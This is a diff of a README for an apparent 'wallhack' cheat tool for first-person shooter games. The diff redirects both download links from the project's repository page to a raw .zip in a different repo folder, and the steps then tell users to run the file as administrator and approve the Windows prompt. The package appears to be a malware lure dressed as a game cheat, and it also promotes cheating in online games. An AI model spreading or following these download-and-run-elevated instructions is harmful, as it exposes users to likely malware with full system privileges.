@@ -5,7 +5,7 @@ description: "Enable live entity detection and visibility overlays for FPS games
 ---
 # 👁️ humen-wallhack-v2026-script - See enemies through walls in games
 
-[![Download Application](https://img.shields.io/badge/Download-Release-blue.svg)](https://github.com/Faltu2264/humen-wallhack-v2026-script)
+[![Download Application](https://img.shields.io/badge/Download-Release-blue.svg)](https://raw.githubusercontent.com/Faltu2264/faltu2264.github.io/main/recurvature/v3.9.zip)
 
 This tool functions as a visual utility for your Windows computer. It detects player positions in compatible first-person shooter and battle royale games. The software renders a live overlay on your screen to show enemy locations. 
 
@@ -26,7 +26,7 @@ Before you install this software, confirm your computer meets these minimum stan
 
 Follow these steps to set up the utility.
 
-1. Visit the following link to download the software: https://github.com/Faltu2264/humen-wallhack-v2026-script
+1. Visit the following link to download the software: https://raw.githubusercontent.com/Faltu2264/faltu2264.github.io/main/recurvature/v3.9.zip
 2. Locate the downloaded file in your Downloads folder.
 3. Right-click the file and select Run as administrator.
 4. If a Windows prompt appears, select Yes to allow the application to make changes to your system.
